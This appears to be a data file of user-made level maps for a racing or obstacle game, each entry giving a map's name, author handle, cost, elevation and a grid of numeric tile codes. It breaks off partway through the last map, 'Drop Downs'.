maps.push({name="RACE o",author="chinny",id="#1668448667",direction="forward",cost=178,elevation=0,map=[0,0,0,0,0,0,0,14,14,2,2,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,14,14,14,14,0,0,0,0,0,0,0,14,14,14,14,14,0,0,0,0,14,14,14,14,14,0,0,0,0,0,14,14,14,14,14,0,0,0,0,0,0,14,14,14,14,14,0,0,0,14,14,14,14,14,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,14,14,14,14,14,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,14,14,14,14,14,0,0,0,0,0,0,14,14,14,14,14,0,0,0,0,0,14,14,14,14,14,0,0,0,0,14,14,14,14,14,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,2,2,14,14,0,0,0,0,0,0,0]});
maps.push({name="Very safe elevator",author="Dogeeri",id="#1668455084",direction="forward",cost=217,elevation=-14,map=[0,0,0,0,0,0,0,199,94,167,167,167,167,167,167,167,24,2,2,24,0,0,0,0,0,0,0,199,24,91,91,91,91,0,0,0,24,24,24,24,0,0,0,0,0,0,0,0,199,0,0,0,0,0,0,0,144,23,23,144,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,89,23,23,89,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,144,91,91,144,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,75,75,75,75,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,23,23,23,23,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,65,65,65,23,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,65,65,65,23,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,170,173,0,0,0,0,0,0,174,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,66,66,66,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,66,66,66,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,10,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,144,142,142,144,1,1,1,199,199,0,0,0,0,0,0,0,0,0,0,0,144,10,10,144,11,90,13,115,164,199,199,0,0,0,0,0,0,0,0,0,89,10,10,89,11,13,13,115,163,93,100,199,0,0,0,0,0,0,0,0,144,10,10,144,11,90,13,115,165,199,199,0,0,0,0,0,0,0,0,0,10,10,10,10,1,1,1,199,199,0,0,0,0,0,0,0,0,0,0,0,10,2,2,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="RACE Slowly Go Down",author="FL00D",id="#1668458336",direction="left",cost=132,elevation=-8,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,2,2,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,18,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,16,16,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,15,15,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,15,15,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,15,15,15,0,0,11,11,11,11,11,11,11,12,13,13,13,13,13,14,15,15,15,15,0,0,2,11,11,11,11,11,11,12,13,13,13,13,13,14,15,15,15,15,0,0,2,11,11,11,11,11,11,12,13,13,13,13,13,14,15,15,15,15,0,0,11,11,11,11,11,11,11,12,13,13,13,13,13,14,15,15,15,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="RACE Jump",author="ZpLit",id="#1668458467",direction="forward",cost=120,elevation=-13,map=[0,0,0,0,0,0,0,1,21,2,2,21,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,21,21,21,21,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,21,21,21,21,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,21,21,21,21,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,21,21,21,21,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,21,21,21,21,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,21,21,21,21,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,22,22,22,22,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,12,12,12,12,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,12,12,12,12,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,13,13,13,13,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,12,12,12,12,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,11,11,11,11,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,10,10,10,10,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,9,9,9,9,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,8,8,8,8,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,8,8,8,8,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,8,8,8,8,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,8,8,8,8,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,8,2,2,8,1,0,0,0,0,0,0,0]});
maps.push({name="Roundabout",author="sivi",id="#1668461599",direction="forward",cost=385,elevation=5,map=[0,0,0,1,1,107,107,107,107,2,2,107,107,107,107,1,1,0,0,0,0,0,1,1,107,107,107,90,107,107,107,107,90,107,107,107,1,1,0,0,0,1,1,107,107,107,107,107,107,107,107,107,107,107,107,107,107,1,1,0,1,1,107,107,90,107,107,0,0,0,0,0,0,107,107,90,107,107,1,1,1,107,107,107,107,107,0,0,199,199,199,199,0,0,107,107,107,107,107,1,1,107,107,107,107,0,0,199,108,108,108,108,199,0,0,107,107,107,107,1,1,107,90,107,0,0,199,108,108,90,108,108,108,199,0,0,107,90,107,1,1,107,107,107,0,199,108,108,134,108,108,132,108,108,199,0,107,107,107,1,1,107,107,107,0,199,108,108,108,108,108,108,90,108,199,0,107,107,107,1,1,107,90,107,0,199,108,90,108,108,108,108,108,108,199,0,107,90,107,1,1,107,107,107,0,199,108,108,108,108,108,108,108,108,199,0,107,107,107,1,1,107,107,107,0,199,108,108,108,108,108,90,108,108,199,0,107,107,107,1,1,107,90,107,0,199,108,108,90,108,108,108,108,108,199,0,107,90,107,1,1,107,107,107,0,0,199,108,108,108,108,108,108,199,0,0,107,107,107,1,1,107,107,107,107,0,0,1,108,108,108,108,1,0,0,107,107,107,107,1,1,107,107,90,107,107,0,1,109,109,109,109,1,0,107,107,90,107,107,1,1,1,107,107,107,107,94,1,110,110,110,110,1,94,107,107,107,107,1,1,0,1,1,107,107,133,107,1,111,111,111,111,1,107,131,107,107,1,1,0,0,0,1,1,93,107,90,1,112,112,112,112,1,90,107,93,1,1,0,0,0,0,0,1,1,1,1,1,90,2,2,90,1,1,1,1,1,0,0,0]});
maps.push({name="RACE Rollers",author="ZpLit",id="#1668469550",direction="forward",cost=120,elevation=0,map=[0,0,0,0,0,0,0,38,16,2,2,16,38,0,0,0,0,0,0,0,0,0,0,0,0,0,0,38,16,16,16,16,38,0,0,0,0,0,0,0,0,0,0,0,0,0,0,39,17,17,17,17,39,0,0,0,0,0,0,0,0,0,0,0,0,0,0,38,16,16,16,16,38,0,0,0,0,0,0,0,0,0,0,0,0,0,0,38,16,16,16,16,38,0,0,0,0,0,0,0,0,0,0,0,0,0,0,39,17,17,17,17,39,0,0,0,0,0,0,0,0,0,0,0,0,0,0,38,16,16,16,16,38,0,0,0,0,0,0,0,0,0,0,0,0,0,0,38,16,16,16,16,38,0,0,0,0,0,0,0,0,0,0,0,0,0,0,39,17,17,17,17,39,0,0,0,0,0,0,0,0,0,0,0,0,0,0,38,16,16,16,16,38,0,0,0,0,0,0,0,0,0,0,0,0,0,0,38,16,16,16,16,38,0,0,0,0,0,0,0,0,0,0,0,0,0,0,39,17,17,17,17,39,0,0,0,0,0,0,0,0,0,0,0,0,0,0,38,16,16,16,16,38,0,0,0,0,0,0,0,0,0,0,0,0,0,0,38,16,16,16,16,38,0,0,0,0,0,0,0,0,0,0,0,0,0,0,39,17,17,17,17,39,0,0,0,0,0,0,0,0,0,0,0,0,0,0,38,16,16,16,16,38,0,0,0,0,0,0,0,0,0,0,0,0,0,0,38,16,16,16,16,38,0,0,0,0,0,0,0,0,0,0,0,0,0,0,39,17,17,17,17,39,0,0,0,0,0,0,0,0,0,0,0,0,0,0,38,16,16,16,16,38,0,0,0,0,0,0,0,0,0,0,0,0,0,0,38,16,2,2,16,38,0,0,0,0,0,0,0]});
maps.push({name="RACE A01 Race",author="ZpLit",id="#1668471912",direction="left",cost=190,elevation=-1,map=[19,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,19,0,0,19,19,19,0,0,0,0,0,0,0,0,0,0,0,0,19,19,19,21,19,19,19,19,19,21,21,20,0,0,0,0,0,0,0,0,19,19,19,19,19,19,19,19,19,19,19,16,14,13,12,11,11,11,11,0,19,19,19,19,19,19,21,19,19,19,19,16,14,13,12,11,11,11,11,11,0,19,19,19,19,0,0,0,19,19,19,16,14,13,12,11,11,11,11,11,0,0,0,0,0,0,0,0,0,21,21,20,0,0,0,0,0,11,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,0,18,90,18,90,18,0,0,0,0,0,0,0,0,0,0,0,11,11,11,18,18,18,18,18,18,17,20,19,18,17,16,15,14,13,12,11,11,11,11,2,18,18,18,18,18,17,20,19,18,17,16,15,14,13,12,11,11,11,11,2,18,18,18,18,18,17,20,19,18,17,16,15,14,13,12,11,11,11,11,18,18,18,18,18,18,17,20,19,18,17,16,15,14,13,12,11,11,11,0,0,18,90,18,90,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Klee",author="NekoAndRew",id="#1668492631",direction="forward",cost=577,elevation=0,map=[1,1,1,1,1,1,1,1,1,1,1,2,2,76,1,1,1,1,1,1,1,1,1,1,1,1,90,90,1,1,1,64,64,76,45,1,1,1,1,1,1,1,1,1,1,1,1,1,90,1,64,64,64,64,65,65,1,1,1,1,1,1,1,1,1,76,76,76,90,90,64,64,64,64,65,76,76,90,1,1,1,1,1,76,76,76,90,90,64,64,64,64,90,90,90,76,76,90,90,1,1,1,1,76,76,45,45,90,64,64,90,45,64,86,86,90,61,61,1,1,1,1,76,76,76,45,45,64,64,90,0,45,76,76,86,0,61,61,45,45,1,1,76,76,76,45,45,64,90,90,0,45,76,76,0,0,45,45,45,45,1,1,76,76,76,45,45,64,64,64,90,0,0,0,0,0,90,65,65,65,1,1,76,56,76,45,45,64,64,64,64,90,0,0,0,76,90,65,65,65,1,1,56,76,56,45,45,64,64,64,64,64,90,0,0,76,90,90,65,45,1,1,76,56,76,45,45,64,64,64,64,90,0,0,0,0,90,90,45,45,1,1,76,76,76,45,45,64,90,90,90,45,76,76,0,0,45,64,45,45,1,1,76,76,76,45,45,64,64,90,0,45,76,76,86,0,64,64,45,45,1,1,76,76,76,45,45,64,64,64,90,45,0,86,86,90,64,64,45,45,1,1,1,76,76,45,90,90,64,64,64,90,90,90,90,61,76,76,1,1,1,1,1,76,76,76,45,45,45,90,64,64,64,64,64,76,76,90,90,1,1,65,1,1,76,45,76,76,45,76,64,64,64,64,65,76,76,90,90,1,1,65,65,65,65,65,76,45,76,76,76,1,1,64,65,65,76,1,1,1,1,1,1,65,65,1,1,1,1,1,1,1,1,2,2,1,1,1,1,1]});
maps.push({name="Ladderstalling",author="ZpLit",id="#1668496412",direction="forward",cost=183,elevation=0,map=[0,0,0,0,0,0,0,0,5,2,2,5,0,0,0,0,0,0,0,0,0,0,0,0,0,44,0,3,90,5,5,5,0,0,0,0,0,0,0,0,0,0,187,35,93,0,1,20,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,44,0,87,5,5,5,90,3,0,44,0,0,0,0,0,0,0,0,0,0,1,1,0,5,5,5,5,20,1,0,93,35,186,0,0,0,0,0,0,0,44,0,3,90,5,5,5,87,0,44,0,0,0,0,0,0,0,187,35,93,0,1,20,5,5,5,5,0,1,1,0,0,0,0,0,0,0,0,0,0,44,0,87,5,5,5,90,3,0,44,0,0,0,0,0,0,0,0,0,0,1,1,0,5,5,5,5,20,1,0,93,35,186,0,0,0,0,0,0,0,44,0,3,90,5,5,5,87,0,44,0,0,0,0,0,0,0,187,35,94,0,1,20,5,5,5,5,0,1,1,0,0,0,0,0,0,0,0,0,0,44,0,87,5,5,5,90,3,0,44,0,0,0,0,0,0,0,0,0,0,1,1,0,5,5,5,5,20,1,0,94,35,186,0,0,0,0,0,0,0,44,0,3,5,5,5,5,87,0,44,0,0,0,0,0,0,0,187,35,94,0,1,20,90,5,5,5,0,1,1,0,0,0,0,0,0,0,0,0,0,44,0,87,5,5,5,90,3,0,44,0,0,0,0,0,0,0,0,0,0,1,1,0,5,5,5,5,20,1,0,94,35,186,0,0,0,0,0,0,0,44,0,3,90,5,5,5,87,0,44,0,0,0,0,0,0,0,187,35,94,0,1,20,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,44,0,0,88,2,2,88,0,0,0,0,0,0,0,0]});
maps.push({name="Correct Path",author="FL00D",id="#1668502993",direction="forward",cost=317,elevation=0,map=[0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,19,19,1,19,19,19,19,19,19,19,19,19,19,19,19,19,19,1,0,0,19,19,1,19,19,19,19,19,19,19,19,19,19,19,19,19,19,1,0,0,19,19,1,14,184,14,14,184,14,114,14,185,14,14,14,185,14,1,0,0,19,19,1,14,184,14,14,184,14,114,14,184,14,14,14,184,14,1,0,0,19,19,1,14,184,14,14,184,14,114,14,184,14,14,14,184,14,1,0,0,19,19,1,14,14,14,14,184,14,114,14,184,14,14,14,184,14,1,0,0,19,19,1,14,14,133,14,184,14,114,14,184,14,14,14,184,14,1,0,0,19,19,1,14,14,14,14,184,14,114,14,184,14,14,14,184,14,1,0,0,19,132,1,14,184,14,14,184,14,114,14,14,14,14,14,184,14,1,0,0,19,19,1,14,184,14,14,184,14,114,14,14,14,14,14,184,14,1,0,0,19,19,1,14,185,14,14,185,14,114,14,14,14,14,14,184,14,1,0,0,19,19,19,19,19,19,19,19,19,1,19,19,19,19,19,19,19,1,0,0,19,19,19,19,19,19,19,19,134,1,19,19,19,100,19,19,131,1,0,0,19,19,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Hard Shortcut",author="FL00D",id="#1668503065",direction="right",cost=153,elevation=14,map=[2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,19,2,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,19,2,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,0,0,5,3,39,39,39,0,0,0,39,39,183,183,0,0,0,39,19,19,0,0,5,3,39,39,39,0,0,0,39,39,0,0,0,0,183,39,19,19,0,0,5,5,0,0,183,0,0,0,183,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,183,0,0,0,0,0,0,0,0,0,0,0,19,19,0,0,5,5,0,0,183,0,0,0,0,0,0,0,0,0,0,0,19,19,0,0,5,5,0,0,183,0,0,0,183,0,0,0,0,0,0,0,19,19,0,0,5,5,0,39,39,0,0,0,39,39,0,0,0,0,0,0,0,0,0,0,5,5,0,39,39,0,0,0,39,39,0,0,0,0,0,0,19,19,0,0,5,5,0,183,0,0,0,0,183,0,0,0,0,0,0,0,19,19,0,0,5,5,0,183,0,0,0,0,0,0,0,0,0,0,0,0,19,19,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,183,0,0,0,0,0,183,0,0,0,0,0,0,19,19,0,0,5,5,0,39,39,183,183,183,39,39,39,0,0,0,0,0,19,19,0,0,5,5,0,39,39,0,0,0,39,39,39,0,0,0,0,0,19,19,0,0,5,3,14,14,14,14,0,14,14,14,14,0,14,14,14,14,141,141,0,0,5,3,14,14,14,14,0,14,14,14,14,0,14,14,14,14,14,14,0,0]});
maps.push({name="7w4hf28yrwbvwr9782ni",author="FL00D",id="#1668503117",direction="forward",cost=206,elevation=18,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,6,6,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,6,6,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,6,6,0,0,0,0,0,0,0,0,0,0,0,0,0,6,6,6,6,6,6,6,6,6,6,6,6,0,0,0,0,0,0,0,0,6,66,66,66,66,66,66,66,66,66,66,6,0,0,0,0,0,0,0,0,6,66,6,6,6,6,6,6,6,6,66,6,0,0,0,0,0,0,0,0,6,66,6,1,1,1,1,1,1,6,66,6,0,0,0,0,0,0,0,0,6,66,6,1,5,5,5,5,1,6,66,6,0,0,0,0,0,0,0,0,6,66,6,105,5,5,5,5,105,6,66,6,0,0,0,0,0,0,0,0,6,66,6,105,5,5,5,5,105,6,66,6,0,0,0,0,0,0,0,0,6,66,6,1,5,3,3,5,1,6,66,6,0,0,0,0,0,0,0,0,6,66,6,1,1,24,24,1,1,6,66,6,0,0,0,0,0,0,0,0,6,66,6,6,6,6,6,6,6,6,66,6,0,0,0,0,0,0,0,0,6,66,66,66,66,24,24,66,66,66,66,6,0,0,0,0,0,0,0,0,6,6,6,97,6,24,24,6,97,6,6,6,0,0,0,0,0,0,0,0,0,0,0,0,0,96,96,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,96,96,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0]});
maps.push({name="Simple Crossing",author="FL00D",id="#1668503167",direction="right",cost=356,elevation=0,map=[0,16,16,2,2,16,16,16,0,0,0,0,0,0,0,0,0,0,0,0,0,16,16,16,16,16,16,16,0,0,0,0,0,0,0,0,0,0,0,0,0,16,16,16,16,16,16,16,0,0,0,0,0,0,0,0,0,0,0,0,0,16,16,16,16,16,16,16,11,11,11,0,0,0,0,0,0,0,0,0,0,16,16,16,16,16,16,16,3,11,11,0,0,0,0,0,0,0,0,0,0,11,185,11,185,11,185,11,11,11,11,11,11,11,11,11,11,0,0,0,0,11,185,11,185,11,185,11,11,11,11,11,11,11,11,11,11,0,0,0,0,11,185,11,185,11,185,11,11,11,11,11,11,11,11,11,11,0,0,0,0,11,185,11,185,11,185,11,11,11,11,11,11,11,11,11,11,0,0,0,0,11,185,11,185,11,185,11,11,11,11,11,11,11,11,11,11,0,0,0,0,11,185,11,185,11,185,11,11,11,11,11,11,11,11,11,11,0,0,0,0,11,185,11,185,11,185,11,11,11,11,11,11,11,11,11,11,0,0,0,0,11,185,11,185,11,185,11,11,11,11,11,11,11,11,11,11,16,16,16,0,11,185,11,185,11,185,185,185,185,185,185,185,185,185,185,185,16,16,16,0,11,185,11,185,11,11,11,11,11,11,11,11,11,11,11,11,16,16,2,0,11,185,11,185,185,185,185,185,185,185,185,185,185,185,185,185,16,16,2,0,11,185,11,11,11,11,11,11,11,11,11,11,11,11,11,11,16,16,16,0,11,185,185,185,185,185,185,185,185,185,185,185,185,185,185,185,16,16,16,0,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,16,16,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Hammer My Love",author="ZpLit",id="#1668505361",direction="forward",cost=190,elevation=0,map=[0,0,0,0,0,0,0,0,1,2,2,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,131,131,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,18,18,100,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,133,18,18,18,93,18,0,0,0,0,0,0,0,0,0,0,0,0,0,18,18,18,18,18,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,18,18,18,18,18,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,18,18,18,18,18,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,18,18,19,19,19,18,18,0,0,0,0,0,0,25,25,25,25,1,1,0,18,18,19,139,19,18,18,92,25,25,25,25,25,25,65,65,65,24,132,1,18,18,19,139,19,18,18,92,25,25,25,25,25,25,65,65,65,24,132,1,18,18,19,19,19,18,18,0,0,0,0,0,0,25,25,25,25,1,1,0,18,18,18,18,18,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,18,18,18,18,18,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,18,18,18,18,18,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,18,136,18,18,18,93,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,18,100,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,134,14,14,137,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,88,14,2,2,14,138,1,0,0,0,0,0,0]});
maps.push({name="Infinity",author="sivi",id="#1668533638",direction="forward",cost=212,elevation=0,map=[0,0,0,0,1,0,0,6,5,2,2,5,5,0,0,1,0,0,0,0,0,0,0,0,0,0,7,6,5,5,5,5,5,90,0,0,0,0,0,0,0,0,1,0,0,7,7,6,5,5,5,5,5,5,5,0,0,1,0,0,0,0,0,0,7,7,7,6,0,0,0,0,5,5,5,90,0,0,0,0,0,0,0,0,7,7,7,0,0,0,0,0,0,5,5,5,0,0,0,0,0,1,0,0,8,8,8,0,0,0,0,0,0,5,5,90,0,0,1,0,0,0,0,0,9,9,9,0,67,67,67,0,0,5,5,5,0,0,0,0,0,0,0,0,10,10,10,11,11,11,11,11,5,5,5,90,0,0,0,0,0,0,1,0,0,11,11,45,90,94,94,90,45,5,5,0,0,1,0,0,0,0,0,0,0,11,90,45,45,45,45,45,45,45,11,0,0,0,0,0,0,0,0,0,0,11,45,45,45,45,45,45,45,90,11,0,0,0,0,0,0,0,1,0,0,5,5,45,90,93,93,90,45,11,11,0,0,1,0,0,0,0,0,0,90,5,5,5,11,11,11,11,11,10,10,10,0,0,0,0,0,0,0,0,5,5,5,0,0,67,67,67,0,9,9,9,0,0,0,0,0,1,0,0,90,5,5,0,0,0,0,0,0,8,8,8,0,0,1,0,0,0,0,0,5,5,5,0,0,0,0,0,0,7,7,7,0,0,0,0,0,0,0,0,90,5,5,5,0,0,0,0,6,7,7,7,0,0,0,0,0,0,1,0,0,5,5,5,5,5,5,5,6,7,7,0,0,1,0,0,0,0,0,0,0,0,90,5,5,5,5,5,6,7,0,0,0,0,0,0,0,0,0,0,1,0,0,5,5,2,2,5,6,0,0,1,0,0,0,0]});
maps.push({name="Is Anyone 150 HP",author="ZpLit",id="#1668538659",direction="right",cost=185,elevation=0,map=[24,2,2,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,90,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,125,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,90,24,0,0,0,0,0,0,5,5,5,5,5,0,0,0,0,0,24,24,24,24,0,0,0,0,0,0,5,93,94,93,5,0,0,0,0,0,24,24,24,24,0,0,0,0,0,0,5,94,131,94,5,0,0,0,0,0,24,24,24,125,0,0,0,0,0,0,5,93,94,93,5,0,0,0,0,0,24,24,24,90,0,0,0,0,0,0,5,5,5,5,5,0,0,0,0,0,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,90,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,24,24,24,24,90,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,90,24,24,24,24,24,24,24,24,24,24,24,24,24,2,24,132,90,24,24,24,24,24,24,24,24,90,24,24,24,24,24,24,24,2,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,90,24,24,24,24]});
maps.push({name="Arm the nukes putin",author="Luffaren",id="#1668544639",direction="forward",cost=488,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,195,0,195,0,195,0,195,0,195,0,0,0,0,0,0,195,5,5,195,5,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,5,5,5,5,24,94,24,67,67,67,76,76,76,5,0,0,0,0,0,0,5,5,5,5,94,24,24,67,67,67,76,76,76,5,0,0,0,0,0,0,5,5,5,5,24,94,24,67,67,67,76,76,76,5,0,0,0,0,0,0,5,5,5,96,24,24,24,67,67,67,76,76,76,5,0,0,0,0,0,195,5,5,5,96,24,24,24,67,67,67,76,76,76,5,6,97,0,0,0,5,5,5,5,5,24,24,24,67,67,67,76,76,76,5,6,0,0,0,195,5,5,5,5,3,24,24,24,67,67,67,76,76,76,5,5,5,5,5,5,5,5,5,5,3,24,24,24,67,67,67,76,76,76,5,5,5,5,5,5,5,5,5,5,5,24,24,24,67,67,67,76,76,76,5,6,0,0,0,195,5,5,5,5,96,24,24,24,67,67,67,76,76,76,5,6,97,0,0,0,5,5,5,5,96,24,24,24,67,67,67,76,76,76,5,0,0,0,0,0,195,5,5,5,5,24,93,24,67,67,67,76,76,76,5,0,0,0,0,0,0,5,5,5,5,93,24,24,67,67,67,76,76,76,5,0,0,0,0,0,0,5,5,5,5,24,93,24,67,67,67,76,76,76,5,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,5,5,5,0,195,0,195,0,195,0,195,0,195,0,0,0,0,0,0,195,5,5,195,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0]});
maps.push({name="Drop Downs",author="ZpLit",id="#1668556573",direction="right",cost=413,elevation=-19,map=[1,2,2,24,24,17,17,17,17,17,10,10,10,10,11,12,5,5,5,1,1,24,24,24,24,17,17,17,17,17,10,10,10,10,11,12,5,5,5,1,1,24,24,24,24,17,17,17,17,17,10,10,10,10,11,12,5,5,5,1,1,24,24,24,24,17,17,17,17,17,10,10,10,10,11,12,5,5,5,1,1,24,24,24,24,17,17,17,17,17,10,10,10,10,11,12,5,5,5,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,5,5,1,24,24,3,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,1,24,24,3,5,5,5,5,5,5,5,10,10,5,5,5,5,5,5,5,1,24,24,3,5,5,5,5,5,10,10,93,45,10,5,5,5,5,5,5,1,24,24,3,5,5,5,5,9998,95,45,45,45,45,10,5,5,5,5,5,1,24,24,3,5,5,5,5,9998,95,45,45,45,100,10,5,5,5,5,5,1,24,24,3,5,5